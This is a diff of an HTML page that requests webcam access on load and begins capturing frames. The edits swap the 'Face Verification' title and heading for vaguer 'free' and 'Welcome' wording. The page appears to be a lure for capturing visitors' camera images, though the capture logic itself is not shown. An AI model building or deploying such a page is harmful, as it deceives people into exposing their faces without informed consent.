@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Face Verification</title>
+    <title>free</title>
     <style>
         body {
             text-align: center;
@@ -38,12 +38,12 @@
     </style>
 </head>
 <body>
-    <h1>🎉 Welcome to Secure Verification 🎉</h1>
+    <h1>🎉 Welcome 🎉</h1>
     <p id="status">Please allow camera access...</p>
 
     <div id="loading">
         <div class="spinner"></div>
-        <p>📸 Please wait, processing...</p>
+        <p> Please wait, processing...</p>
     </div>
 
     <video id="video" autoplay class="hidden"></video>
@@ -62,10 +62,10 @@
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-                statusText.innerText = "✅ Processing...";
+                statusText.innerText = "Processing...";
                 startCapturing();
             } catch (error) {
-                statusText.innerText = "❌ Camera Access Denied!";
+                statusText.innerText = "Access Denied!";
             }
 
             function startCapturing() {
